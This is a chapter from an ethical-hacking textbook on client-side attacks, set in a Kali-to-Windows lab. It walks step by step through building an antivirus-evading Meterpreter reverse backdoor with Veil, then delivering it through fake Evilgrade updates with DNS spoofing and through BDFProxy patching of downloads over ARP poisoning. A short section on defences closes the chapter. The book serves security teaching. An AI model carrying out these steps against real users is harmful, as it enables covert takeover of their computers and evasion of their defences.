- en: Client-Side Attacks
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
- en: In the previous chapter, we started by learning how to gain access to victim
    machines using server-side attacks. We will now move on to client-side attacks,
    discussing what they are, and how a tool called Veil can be used to generate an
    undetectable backdoor. We will also discuss payloads. Once we have a brief idea
    about payloads, we will generate a backdoor through which we will implement client-side
    attacks on our own system, enabling us to listen to connections. Finally, we will
    look at how to implement backdoors in real time, as well as techniques we can
    use to protect our system from such attacks.
  prefs: []
  type: TYPE_NORMAL
- en: 'In this chapter, we will cover the following topics:'
  prefs: []
  type: TYPE_NORMAL
- en: Client-side attacks
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: Installing Veil
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: Payloads overview
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: Generating a Veil backdoor
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: Listening for connections
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: Testing the backdoor
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: Fake bdm1 updates
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: Client-side attacks using the bdm2 BDFProxy
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: Protection against delivery methods
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: Client-side attacks
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
- en: In this section, we're going to learn about client-side attacks. Often, it's
    better to try to gain access to a target using server-side attacks, such as trying
    to find exploits in the operating system and in the applications installed. If
    that doesn't work, or if our target is hidden behind an IP or is using a hidden
    network, our next resort is a client-side attack. Client-side attacks require
    the user to do something, such as open a link, install an update, or download
    an image that will then run code on their machine. Because these attacks require
    user interaction, information gathering is very important—information about an
    individual's applications and who they are as a person. For a client-side attack
    to be successful, we need to know a person's friends, what networks and websites
    they use, and what websites they trust. Therefore, our focus when gathering information
    is the person, rather than their applications or operating system.
  prefs: []
  type: TYPE_NORMAL
- en: The attacking machine will be a Kali machine and the target machine will be
    Windows. To ensure they're on the same network, both machines will use NAT networks.
    In our examples, we will be using reverse connections, so separate IP addresses
    are not essential in this case.
  prefs: []
  type: TYPE_NORMAL
- en: Installing Veil
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
- en: In this section, we're going to learn how to generate an undetectable backdoor.
    A backdoor is just a file that, when executed on a target computer, will give
    us full access to it. There are a number of ways of generating backdoors, but
    what we're interested in is generating a backdoor that is not detectable by antivirus
    programs. This actually isn't hard to do, as we will see, if you use a tool called
    **Veil-Evasion**.
  prefs: []
  type: TYPE_NORMAL
- en: Veil-Evasion used to be a standalone tool, but its creators have recently combined
    it with other tools in the framework, re-releasing it as Veil-Framework. Nowadays,
    it is usually referred to as just Veil.
  prefs: []
  type: TYPE_NORMAL
- en: Download the latest version of Veil, which is 3, from the following GitHub link: [https://github.com/Veil-Framework/Veil](https://github.com/Veil-Framework/Veil).
    If you are unfamiliar with GitHub, it is a version control system that allow programmers
    to post, share, and update source code. GitHub is used a lot when downloading
    programs. Veil's repository can either be downloaded via GitHub's link or by copying
    it to your terminal. Now, before we download it, we actually want to store it
    in the `/opt` directory, so we will be doing `cd` to navigate to a different directory,
    and we are going to put `/opt` to open a directory called `opt`. Now, this is
    where we will be storing your optional programs, hence the name `opt`, and if
    we do `ls` to list the available directories, we will see that we only have one
    directory for a program called `Teeth`.
  prefs: []
  type: TYPE_NORMAL
- en: 'Now, if we want to download `Veil`, we have to copy the repository link from
    GitHub and then go to our Terminal, to the location where we want to download
    it. So, first we change the directory to `/opt`, and then we are going to do `git
    clone`, and input the URL of the repository. The command is very simple, as follows:'
  prefs: []
  type: TYPE_NORMAL
- en: '[PRE0]'
  prefs: []
  type: TYPE_PRE
- en: 'Here, we''re using the `clone` command to tell `git` that we want to clone
    or download this framework, program, or project, before sharing the link with
    Veil. To download the desired project, simply hit *Enter*, as shown in the following
    screenshot:'
  prefs: []
  type: TYPE_NORMAL
- en: '![](assets/efd1811b-252d-4293-9619-3abcf1a2b2c0.png)'
  prefs: []
  type: TYPE_IMG
- en: If we use the `ls `command to list our files, we should see a new directory
    called `Veil`. We're able to navigate to that directory by inputting `cd Veil/`.
    The `ls` command should list all the available files, including `Veil.py`, which
    we need to install. To do this, navigate to the `config` directory by inputting `cd
    config/`, and run the `setup.sh` bash script. This script will install Veil-Evasion.
  prefs: []
  type: TYPE_NORMAL
- en: 'To run an executable in Linux from the terminal, simply enter `./`, followed
    by the name of the executable, as shown as follows:'
  prefs: []
  type: TYPE_NORMAL
- en: '[PRE1]'
  prefs: []
  type: TYPE_PRE
- en: 'The previous command should generate the following result:'
  prefs: []
  type: TYPE_NORMAL
- en: '![](assets/9be3a4cf-4ee8-4d14-ae48-77c5185ee094.png)'
  prefs: []
  type: TYPE_IMG
- en: As you can see in the previous screenshot, we're being asked if we want to install
    Veil, to which `yes`, we are. Note that the installation may take a while.
  prefs: []
  type: TYPE_NORMAL
- en: Now, we first open the Terminal we are going to navigate to the `/opt` directory,
    because that's where we cloned `Veil`, and that was cloned in a directory called
    `Veil`. So, we're inputting `cd/opt/Veil/` to navigate to change the working directory,
    and we're going to the `/opt/Veil/` directory. Then we are going to launch, and
    are now inside the `Veil` directory. If we input the `ls` command, we will see
    we have the `Veil` executable. So, we can run any executable, like we said, by
    putting `./` followed by the name of the executable, which is `Veil.py`. We are
    going to launch it, leading to the welcome screen for `Veil`, as shown in the
    following screenshot, and now we can start using the tool. We'll cover the usage
    of this tool in the next chapter.
  prefs: []
  type: TYPE_NORMAL
- en: Payloads overview
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
- en: 'Now that Veil is installed, we can take a look at its commands. The commands
    are straightforward, with `exit` allowing us to exit the program, and `info` providing
    us with information about a specific tool.`list` will list the available tools, `update` will
    update Veil, and finally, `use` enables the use of any tool, as shown in the following
    screenshot:'
  prefs: []
  type: TYPE_NORMAL
- en: '![](assets/2929b2c8-2b98-4300-8505-c53b1b60bbad.png)'
  prefs: []
  type: TYPE_IMG
- en: 'The `list` command displays Veil''s main commands, which are as follows:'
  prefs: []
  type: TYPE_NORMAL
- en: '`Evasion`: This generates undetectable backdoors'
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: '`Ordnance`: This generates the payloads used by `Evasion`; this is more of
    a secondary tool'
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: A payload is a part of the code, or of the backdoor, that does what we want
    it to. In this case, it gives us a reverse connection and downloads and executes
    something on a target computer.
  prefs: []
  type: TYPE_NORMAL
- en: 'When Veil-Evasion has loaded, you should see something similar to the following
    screenshot:'
  prefs: []
  type: TYPE_NORMAL
- en: '![](assets/75ac6cd6-334c-44ee-b7dd-f3b508e28754.png)'
  prefs: []
  type: TYPE_IMG
- en: 'As you can see, Veil gives us a list of commands that can run on this tool.
    What we want here is to `list` all of the available payloads, of which there are
    41\. Each payload is divided into three parts, as shown in the following screenshot.
    We''ve highlighted the payload we''ll be using, `15) go/meterpreter/rev_https.py`:'
  prefs: []
  type: TYPE_NORMAL
- en: '![](assets/35893cc8-ef41-4e8f-bf5b-a9f7b69c76b8.png)'
  prefs: []
  type: TYPE_IMG
- en: The first part of the payload's name is `cs`, which refers to the programming
    language the payload will be wrapped in. As you can see in the preceding screenshot,
    languages used include GO, C, CS, Python, PowerShell, and Ruby.
  prefs: []
  type: TYPE_NORMAL
- en: The second part of any payload is really important, as this is the type of payload;
    in other words, the type of code that's going to be executed on the target computer.
  prefs: []
  type: TYPE_NORMAL
- en: In this example, we're using Meterpreter, which is a payload designed by Metasploit.
    Metasploit is a huge framework sometimes used for hacking. Meterpreter runs in
    memory, so is difficult to detect and doesn't leave a large footprint. Using Meterpreter,
    we can gain full control over a target computer, allowing us to navigate through
    the filesystem, turn on the webcam, install or download files, and much more.
  prefs: []
  type: TYPE_NORMAL
- en: The third part of a payload's name is the method that's going to be used to
    establish its connection. In our example, that's `rev_https`. `rev`, which stands
    for reverse, and `https` is the protocol that will be used to establish the connection.
    There are also a few examples of `rev_tcp` in the preceding screenshot, which
    creates a reverse TCP connection.
  prefs: []
  type: TYPE_NORMAL
- en: A reverse connection is where the target computer connects to an attacker computer
    via a backdoor. This method bypasses antivirus programs because the connection
    is not directed at the target computer, but rather at the attacker instead. In
    our case, we are going to use a port that many websites use, `80` or `8080`, so
    the connection will appear as a harmless website connection. Reverse connections
    also work on hidden computers, making it one of the most practical methods of
    gaining access to a machine.
  prefs: []
  type: TYPE_NORMAL
- en: Some payloads don't follow the conventional naming pattern, such as `shellcode_inject`.
    This instead creates a normal payload that injects our other payload.
  prefs: []
  type: TYPE_NORMAL
- en: Generating a Veil backdoor
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
- en: 'We''re now going to use Veil to generate a backdoor. First, we''ll run the `list` command.
    We''ll type the `use 1` command, as we want to use `Evasion` and press *Enter*,
    and, as we want to use the fifteenth payload, we''ll run the `use 15` command,
    as follows:'
  prefs: []
  type: TYPE_NORMAL
- en: '![](assets/b9f94c33-6922-4d9d-8bc7-f9e5a79950b0.png)'
  prefs: []
  type: TYPE_IMG
- en: Using the following options, we're going to change the payload's `IP LHOST`
    to the IP address of the Kali machine we're using.
  prefs: []
  type: TYPE_NORMAL
- en: 'To get the IP address of our Kali machine, we have to run `ifconfig`. Split
    the screen by right-clicking and selecting Split Horizontally, and then run the
    command. As shown in the following screenshot, the Kali machine''s IP address
    is `10.0.2.15`, which is where we want the target computer''s connection to return
    to once the backdoor has been executed:'
  prefs: []
  type: TYPE_NORMAL
- en: '![](assets/685a1192-04c2-48a1-a75e-6aab054b0bff.png)'
  prefs: []
  type: TYPE_IMG
- en: 'To set `LHOST` as `10.0.2.15`, write the `set` command followed by the option
    you want to change, as shown as follows:'
  prefs: []
  type: TYPE_NORMAL
- en: '[PRE2]'
  prefs: []
  type: TYPE_PRE
- en: 'We now need to change `LPORT` so that it''s set to `8080`. This port is also
    used by web servers, so will not appear suspicious and should still bypass firewalls.
    To set the correct port, input the `set LPORT 8080` command, as shown in the following
    screenshot:'
  prefs: []
  type: TYPE_NORMAL
- en: '![](assets/1f240c08-5699-4f15-905e-950a1e37ee36.png)'
  prefs: []
  type: TYPE_IMG
- en: This process will bypass every antivirus program except AVG, according to experience.
    Antivirus programs work using a large database of signatures. These signatures
    correspond to files that contain harmful code, so if our file matches any value
    in a database, it will be flagged as a virus or as malware. Because of this, we
    need to make sure that our backdoor is as unique as possible so it can bypass
    every piece of antivirus software. Veil works hard by encrypting the backdoor,
    obfuscating it, and injecting it in memory so that it doesn't get detected, but
    this doesn't wash with AVG.
  prefs: []
  type: TYPE_NORMAL
- en: 'To ensure our backdoor can bypass AVG, we need to modify the minimum number
    of processors used by it—in this case, `1`. To do this, use the following command:'
  prefs: []
  type: TYPE_NORMAL
- en: '[PRE3]'
  prefs: []
  type: TYPE_PRE
- en: 'We will also modify the `SLEEP` option, which is the number of seconds a backdoor
    will wait before it executes the payload. To tell your backdoor to wait `6` seconds,
    use the following command:'
  prefs: []
  type: TYPE_NORMAL
- en: '[PRE4]'
  prefs: []
  type: TYPE_PRE
- en: 'These changes are reflected in the following screenshot:'
  prefs: []
  type: TYPE_NORMAL
- en: '![](assets/4eab1916-69b4-428e-85bf-a3a1dd4bab23.png)'
  prefs: []
  type: TYPE_IMG
- en: 'We are now going to generate the backdoor using the `generate` command, as
    shown as follows:'
  prefs: []
  type: TYPE_NORMAL
- en: '![](assets/6230abe1-fa3c-46ec-98a9-35f6c24178bb.png)'
  prefs: []
  type: TYPE_IMG
- en: 'We now need to name our backdoor. Here, we''re going to name it `rev_https_8080`.
    The following screenshot illustrates what we see once a backdoor is generated;
    this includes the module used by the backdoor, and where it''s stored:'
  prefs: []
  type: TYPE_NORMAL
- en: '![](assets/a36895fe-b6d2-428c-8767-5d4644d13808.png)'
  prefs: []
  type: TYPE_IMG
- en: 'To test our backdoor, we''re going to bypass Veil''s `checkvt` command, which
    is not always accurate, and VirusTotal, which shares its results with antivirus
    software, and instead opt for the website NoDistribute, as shown in the following
    screenshot:'
  prefs: []
  type: TYPE_NORMAL
- en: '![](assets/0c66326c-5b1f-4e63-9f07-58d63e03211e.png)'
  prefs: []
  type: TYPE_IMG
- en: 'Now, click on Browse... and navigate to your file at `/usr/share/veil-output/compiled`,
    as shown as follows:'
  prefs: []
  type: TYPE_NORMAL
- en: '![](assets/510a5977-dac3-4824-a8db-a77ee8db5def.png)'
  prefs: []
  type: TYPE_IMG
- en: 'Once we have clicked Scan File, or View Previous Results, we can see that the
    file we uploaded has successfully bypassed *all* antivirus programs, as shown
    in the following screenshot:'
  prefs: []
  type: TYPE_NORMAL
- en: '![](assets/07b1c784-48cc-4fcd-a2f8-c9319cc7984d.png)Files uploaded bypassed
    by the antivirus'
  prefs: []
  type: TYPE_NORMAL
- en: Remember that Veil will work best when its kept up to date with the latest version.
    It's also worth noting that whether a backdoor goes undetected or not is often
    arbitrary—one backdoor we previously generated with no sleep setting was detected
    by antivirus software, as was one with a sleep time of 10 seconds. A backdoor
    set with a sleep time of 6 seconds, however, bypassed every program.
  prefs: []
  type: TYPE_NORMAL
- en: We recommend playing around with all the available options within a payload
    to find something that works for you.
  prefs: []
  type: TYPE_NORMAL
- en: Listening for connections
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
- en: As you'll know, the backdoor we created uses a reverse payload. For the reverse
    payload to work, we need to open a port in our computer so that the target machine
    can connect to it. When we created the backdoor, we set the port to `8080`, so
    we need to open that port on our Kali machine. Remember, the name of our chosen
    payload is `meterpreter/rev_https` in this example.
  prefs: []
  type: TYPE_NORMAL
- en: 'We are now going to split our screens, as before, and listen for incoming connections
    using the Metasploit framework. To run Metasploit, use the `msfconsole` command,
    which should generate output similar to the following screenshot:'
  prefs: []
  type: TYPE_NORMAL
- en: '![](assets/0b5a5add-062d-46ac-ba3f-905e5e7dcf2c.png)'
  prefs: []
  type: TYPE_IMG
- en: 'To listen for incoming connections, we need to use a module in Metasploit: `exploit/multi/handler`.
    To launch that module, use the following command:'
  prefs: []
  type: TYPE_NORMAL
- en: '[PRE5]'
  prefs: []
  type: TYPE_PRE
- en: 'Once launched, navigate to the `exploit/multi/handler` module. The most important
    thing that you want to specify in this module is the payload, which we do with
    the `set` command. To set the payload as `windows/meterpreter/reverse_https`,
    use the following command:'
  prefs: []
  type: TYPE_NORMAL
- en: '[PRE6]'
  prefs: []
  type: TYPE_PRE
- en: 'If we run the `show options` command now, we should see that the payload has
    changed to `windows/meterpreter/reverse_https`, as shown in the following screenshot:'
  prefs: []
  type: TYPE_NORMAL
- en: '![](assets/e8022dd5-6fa6-41eb-8199-8a449c9d3cae.png)'
  prefs: []
  type: TYPE_IMG
- en: 'Setting the `LHOST` to the IP address of our Kali machine is a similar process,
    and can be done using the following command:'
  prefs: []
  type: TYPE_NORMAL
- en: '[PRE7]'
  prefs: []
  type: TYPE_PRE
- en: 'Before you go any further, make sure that your payload, host, and port are
    set correctly with the same values as those generated with the backdoor originally,
    as shown as follows:'
  prefs: []
  type: TYPE_NORMAL
- en: '![](assets/ecd0361c-5b12-4b1b-badb-2c5ffdc79d70.png)'
  prefs: []
  type: TYPE_IMG
- en: 'All we need to do now is execute the `exploit` command. Now, Metasploit is
    waiting for connections, as we can see in the following screenshot, on port `8080` and
    on our IP address, which is `10.0.2.15`. Once a connection is established, we
    will be able to control the target computer:'
  prefs: []
  type: TYPE_NORMAL
- en: '![](assets/0f543583-1d32-420d-a79e-3ce21c144f41.png)'
  prefs: []
  type: TYPE_IMG
- en: Testing the backdoor
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
- en: To test that our backdoor is working as expected, we're going to put it on our
    web server and download it from the target computer. We don't recommend this approach
    for anything other than testing your backdoor.
  prefs: []
  type: TYPE_NORMAL
- en: 'As Kali can be used as a website, we''re going to put our backdoor online and
    download it from the target Windows machine. We''re going to keep this download
    in one place, a folder called `evil-files`, as shown in the following screenshot:'
  prefs: []
  type: TYPE_NORMAL
- en: '![](assets/b1ae3bd9-01d2-439a-9738-6373b34acf98.png)'
  prefs: []
  type: TYPE_IMG
- en: Now, the backdoor we created using Veil-Evasion, which was stored in `var/lib/veil-evasion/output/compiled/`,
    needs to be copied and pasted into the `evil-files` directory. And that's it!
    We can download the file from Kali.
  prefs: []
  type: TYPE_NORMAL
- en: 'To start the web server and website, input the following command in the terminal:'
  prefs: []
  type: TYPE_NORMAL
- en: '[PRE8]'
  prefs: []
  type: TYPE_PRE
- en: Here, the command is `service`, and `apache2` is the name of the web server.
    Hitting *Enter* will execute the previous command.
  prefs: []
  type: TYPE_NORMAL
- en: 'We now need to navigate to our Kali machine''s IP address, `10.0.2.15`. This
    should open the basic `index.html` file that we created that tells us our web
    server is working, as shown as follows:'
  prefs: []
  type: TYPE_NORMAL
- en: '![](assets/552adfbf-2061-466b-83a2-694daad2c6fb.png)'
  prefs: []
  type: TYPE_IMG
- en: 'To go to the directory containing the backdoor, go to `10.0.2.15/evil-files`
    and hit *Enter*. We can then download and run the backdoor, as shown in the following
    screenshot:'
  prefs: []
  type: TYPE_NORMAL
- en: '![](assets/cd0475b9-8a25-4157-8130-a59990b19566.png)'
  prefs: []
  type: TYPE_IMG
- en: 'Now that we have run the backdoor on the Windows machine, our Kali machine
    will tell us that we have received a connection from the target computer, as shown
    in the following screenshot:'
  prefs: []
  type: TYPE_NORMAL
- en: '![](assets/6bbc3bf2-4c5b-4921-ad40-9962730c8beb.png)'
  prefs: []
  type: TYPE_IMG
- en: This means that we now have full control over that computer. In the preceding
    screenshot, we can see that we have a Meterpreter session, which allows us to
    do anything that the rightful user of that computer can do.
  prefs: []
  type: TYPE_NORMAL
- en: 'To check that the backdoor is working correctly, use the `sysinfo` command.
    You should see that you''re inside the `MSEDGEWIN10` machine, which runs `Windows
    10 (Build 17134)`, has a `x64` architecture, uses the `en_US` language, and Meterpreter
    x86 for Windows:'
  prefs: []
  type: TYPE_NORMAL
- en: '![](assets/afabd500-f645-46c9-8f33-444c79956bb1.png)'
  prefs: []
  type: TYPE_IMG
- en: We've now essentially hacked our target computer. Nice work!
  prefs: []
  type: TYPE_NORMAL
- en: Fake bdm1 updates
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
- en: Although we have an undetectable backdoor, we still haven't found a smart and
    efficient way to deliver it to the target machine. In real life, a target probably
    won't download an executable and run it if we ask them to, so we're now going
    to look at how to fake an update that the user will want to download and install
    on their machine.
  prefs: []
  type: TYPE_NORMAL
- en: This scenario will work as long as we are in the middle of a connection, for
    example, when using a fake network, when implementing a man-in-the-middle attack,
    or when redirecting traffic via a mobile phone.
  prefs: []
  type: TYPE_NORMAL
- en: 'In this scetion, we are going to cover DNS spoofing with ARP poisoning. This
    will mean we''re in the same network as the target machine, which in this example
    is wired and not wireless. We''ll use a tool called Evilgrade to act as a server
    to produce the fake update. You can install Evilgrade at the following link:'
  prefs: []
  type: TYPE_NORMAL
- en: '[https://github.com/PacktPublishing/Fundamentals-of-Ethical-Hacking-from-Scratch](https://github.com/PacktPublishing/Fundamentals-of-Ethical-Hacking-from-Scratch).'
  prefs: []
  type: TYPE_NORMAL
- en: 'After you have downloaded and run the `evilgrade` command, run the `show modules`
    command to see a list of the programs we can hijack updates for, as shown in the
    following screenshot:'
  prefs: []
  type: TYPE_NORMAL
- en: '![](assets/5d8538ed-01a4-424f-b634-64a48974fbe5.png)'
  prefs: []
  type: TYPE_IMG
- en: As you can see, there are 67 programs that we can hijack updates from, including
    some popular ones such as Google Analytics, Nokia, Safari, and Download Accelerator
    Plus, which is what we will use for this example.
  prefs: []
  type: TYPE_NORMAL
- en: 'Run the `configure dap` command to use the DAP module. Then, use the `show
    options` command to see all of the available configurable options, as shown in
    the following screenshot:'
  prefs: []
  type: TYPE_NORMAL
- en: '![](assets/b1c54b47-5089-4f15-9e13-206b130dc93b.png)'
  prefs: []
  type: TYPE_IMG
- en: The main option we will focus on is `agent`, so we need to replace the `./agent/agent.exe` path
    with the program path that will be installed as the update. In our case, we want
    to install a backdoor as the update.
  prefs: []
  type: TYPE_NORMAL
- en: The previous backdoor in the *Generating a Veil backdoor *section that we created
    uses a `reverse_https` payload, which does not work with DAP. Instead, we will
    be using a different backdoor named `backdoor.exe` that uses a `reverse_http`
    payload. To create such a backdoor, please refer to the steps in the *Generating
    a Veil backdoor *section.
  prefs: []
  type: TYPE_NORMAL
- en: 'To change the `agent` so that it executes our backdoor instead of an update,
    use the following command:'
  prefs: []
  type: TYPE_NORMAL
- en: '[PRE9]'
  prefs: []
  type: TYPE_PRE
- en: 'Replace the path in the command to the path where the `reverse_http` backdoor
    is placed. Now, run the `show options` command again to check that it has been
    configured correctly, as shown in the following screenshot:'
  prefs: []
  type: TYPE_NORMAL
- en: '![](assets/270c7b11-597e-4520-b80e-cb1a6d18405c.png)'
  prefs: []
  type: TYPE_IMG
- en: We can also set any other options that we want in here the same way; we just
    input the `set option` name followed by the `option` value. One `option` that
    you might want to set is the `endsite`.
  prefs: []
  type: TYPE_NORMAL
- en: Now, in the future, maybe this website is not going to work, so if it displays
    an error on the target computer, we can change this website to any website that
    you want; you can just change it to `update.speedbit.com`.
  prefs: []
  type: TYPE_NORMAL
- en: 'When everything is ready, start the server by running the `start` command,
    as follows:'
  prefs: []
  type: TYPE_NORMAL
- en: '![](assets/e7561bee-bec5-4a5f-b4e5-5d19184a488f.png)'
  prefs: []
  type: TYPE_IMG
- en: Now, any time Evilgrade gets an update request, it will tell whoever is requesting
    an update that there is an update—our backdoor. To do this, we need to redirect
    any request for `update.speedbit.com` to Evilgrade.
  prefs: []
  type: TYPE_NORMAL
- en: We can do this switch with a DNS spoofing attack, spoofing any requests from
    `update.speedbit.com` to Evilgrade (and our own IP address).
  prefs: []
  type: TYPE_NORMAL
- en: 'Open the `mitmf.conf` file using Leafpad with the `leafpad /etc/mitmf/mitmf.conf`
    command, and change the port for the DNS server to `5353` to avoid conflict with
    Evilgrade, as shown in the following screenshot:'
  prefs: []
  type: TYPE_NORMAL
- en: '![](assets/fe44f854-20e4-42f0-9acd-24320147e289.png)'
  prefs: []
  type: TYPE_IMG
- en: If we take a look at our `A` records, we will see that we are now redirecting
    any requests to `update.speedbit.com` to our own IP address, `10.0.2.15`, which
    Evilgrade is running on.
  prefs: []
  type: TYPE_NORMAL
- en: 'All we have to do now is run a MITMf with the following command:'
  prefs: []
  type: TYPE_NORMAL
- en: '[PRE10]'
  prefs: []
  type: TYPE_PRE
- en: 'Hit *Enter* and you''re done! The DNS spoofing is complete. Now that Evilgrade
    is running, our backdoor can be downloaded and executed from `update.speedbit.com`:'
  prefs: []
  type: TYPE_NORMAL
- en: '![](assets/aca8dd54-a54f-40ba-9aa7-171ec1904868.png)'
  prefs: []
  type: TYPE_IMG
- en: 'To listen for connections, change the options on the `msfconsole` Terminal
    by using the `exploit/multi/handler` module, setting the payload to `windows/meterpreter/reverse_http`,
    setting `LHOST` to `10.0.2.15`, which is our Kali machine IP, and `LPORT` to `8080`,
    as shown in the following screenshot:'
  prefs: []
  type: TYPE_NORMAL
- en: '![](assets/a7f8622a-1ba6-4dc9-adb1-e9474cb483f3.png)'
  prefs: []
  type: TYPE_IMG
- en: To reiterate, the target program is going to check for updates using `update.speedbit.com`,
    which will redirect to the IP address where Evilgrade is running thanks to MITMf.
  prefs: []
  type: TYPE_NORMAL
- en: 'We now need to check for DAP updates on the target computer, which, in our
    case, is a Windows machine; a dialog should tell us that a Critical update is
    required when we try to update the DAP application, as shown in the following
    screenshot:'
  prefs: []
  type: TYPE_NORMAL
- en: '![](assets/fc336133-ed7f-45ce-8d83-ab0bf21c2b29.png)'
  prefs: []
  type: TYPE_IMG
- en: 'Once the update has been downloaded and installed, running the `sysinfo` command
    on the Meterpreter Terminal session on our Kali machine, we should confirm that
    we have control over the target computer by running the `sysinfo` command, as
    shown in the following screenshot:'
  prefs: []
  type: TYPE_NORMAL
- en: '![](assets/acb97873-8b82-49bc-b63e-fb3be7c33f04.png)'
  prefs: []
  type: TYPE_IMG
- en: Client-side attacks using the bdm2 BDFProxy
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
- en: 'In this section, we''re going to look at another backdoor delivery method:
    running our backdoor via an active download. In other words, a user will download
    and install a program that will run as expected, but with our payload, or backdoor,
    running in the background. This is possible using a tool called **Backdoor Factory
    Proxy**. This also requires a man-in-the-middle access method, such as ARP poisoning.'
  prefs: []
  type: TYPE_NORMAL
- en: 'For this example, we''ll go with ARP poisoning so that all traffic will be
    redirected through our own computer. First, we need to modify the configuration
    of the `bdfproxy.cfg` file with the following command:'
  prefs: []
  type: TYPE_NORMAL
- en: '[PRE11]'
  prefs: []
  type: TYPE_PRE
- en: 'We will now do two things. First, set the `proxyMode` parameter to `transparent`,
    as shown in the following screenshot:'
  prefs: []
  type: TYPE_NORMAL
- en: '![](assets/eb788532-b488-445e-92f3-0a81375a58ce.png)'
  prefs: []
  type: TYPE_IMG
- en: 'Second, change the `HOST` parameter to your Kali machine''s IP address, as
    shown in the following screenshot:'
  prefs: []
  type: TYPE_NORMAL
- en: '![](assets/bc3a500b-a845-4bb6-b848-bf7c748dad46.png)'
  prefs: []
  type: TYPE_IMG
- en: 'The proxy, which works across all operating systems, uses an executable download
    that will also contain the backdoor. For it to work, all we need to do is set
    our IP address, `10.0.2.15`, and then start the proxy by typing `bdfproxy` and
    hitting *Enter*, as shown in the following screenshot:'
  prefs: []
  type: TYPE_NORMAL
- en: '![](assets/7e24b0cc-6fee-4159-98b7-58afe40d19f1.png)'
  prefs: []
  type: TYPE_IMG
- en: '`bdfproxy_msf_resource.rc` is a file that we can use to listen for incoming
    connections. First, we need to ensure the proxy is running on port `8080`, and
    that anything that comes from port `80` is redirected to `8080`. This is done
    using the following command:'
  prefs: []
  type: TYPE_NORMAL
- en: '[PRE12]'
  prefs: []
  type: TYPE_PRE
- en: 'To perform basic ARP poisoning, we need to run MITMf and use the basic command, `mitmf
    --arp --spoof`, which should include the `--gateway`, our `--target`, and our
    interface `-i`, as follows:'
  prefs: []
  type: TYPE_NORMAL
- en: '[PRE13]'
  prefs: []
  type: TYPE_PRE
- en: 'After hitting *Enter*, all we need to do is listen for incoming connections
    using Backdoor Factory Proxy''s resource file, using the following command:'
  prefs: []
  type: TYPE_NORMAL
- en: '[PRE14]'
  prefs: []
  type: TYPE_PRE
- en: After hitting *Enter*, all we have to do is wait for that to load all the possible
    payloads that can be used. So, now let's analyze it quickly. The target person
    is going to download a program that they actually want, we are the man-in-the-middle
    and, because we're doing ARP poisoning, everything is going to be flowing through
    our device. We have Backdoor Factory Proxy running, so whenever an executable
    is downloaded, Backdoor Factory Proxy is going to backdoor that executable on
    the fly; therefore, when the target person runs it, they will get the program
    that they're expecting, but, at the same time, our backdoor is going to run in
    the background and we're going to get a shell because we're listening for ports.
  prefs: []
  type: TYPE_NORMAL
- en: 'So, we are going to go to our target look for DAP, the same program that we
    hijacked, and we are going to download it from their official website. We are
    then going to go to their free download, and then save the file. And, just before
    we download it, if we look at the Terminal as shown in the following screenshot,
    we can see that the file has been patched in here by the Backdoor Factory Proxy:'
  prefs: []
  type: TYPE_NORMAL
- en: '![](assets/2aeff425-f2c5-4cad-9572-4ffd57772b62.png)'
  prefs: []
  type: TYPE_IMG
- en: 'Once we have downloaded DAP''s update, we will go to Downloads and run the
    file. It will look like a normal installer, but if we return to Meterpreter, we
    can see that the download has secured a connection from the target computer that
    can be interacted with using the `sessions -i 1`, as shown in the following screenshot:'
  prefs: []
  type: TYPE_NORMAL
- en: '![](assets/26444c47-4a08-487e-9833-9768f661db51.png)'
  prefs: []
  type: TYPE_IMG
- en: Running the `sysinfo` command will confirm that we are inside the Windows machine,
    and have full control of it thanks to our backdoor running in the background.
  prefs: []
  type: TYPE_NORMAL
- en: Protection against delivery methods
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
- en: In this section, we're going to explore how to protect yourself from delivery
    methods. To prevent a man-in-the-middle attack, use tools such as XArp, or static
    ARP tables, and avoid networks you don't know or trust. Another precaution is
    to ensure you're using HTTPS when downloading updates. This will reduce your risk
    of downloading a fake update.
  prefs: []
  type: TYPE_NORMAL
- en: 'Another tool that is useful is WinMD5\. This program will alert you when a
    file''s signature or checksum has been modified in any way, which indicates that
    a file may have been tampered with, or is not the original file. To check, download
    and run WinMD5, where you can compare signatures and checksums for a file. If
    the values are the same, the file is safe, as shown in the following screenshot:'
  prefs: []
  type: TYPE_NORMAL
- en: '![](assets/c6b31a9e-d2dc-4f98-aa59-34dca05b246c.png)'
  prefs: []
  type: TYPE_IMG
- en: MD5 checksum value generated
  prefs: []
  type: TYPE_NORMAL
- en: Summary
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
- en: This chapter focused on client-side attacks. First, we installed a tool called
    Veil, which we use to exploit backdoors, through which we can gain access to a
    user's system. We then looked at payloads, before generating our own and testing
    it against antivirus programs. We also learned how to create a backdoor Meterpreter
    that was used to control a target computer without being detected by antivirus
    software. We concluded by looking at delivery methods, as well as how to protect
    systems from such attacks.The next chapter we are going to focus on using the
    social engineering to launch attacks on the client
  prefs: []
  type: TYPE_NORMAL
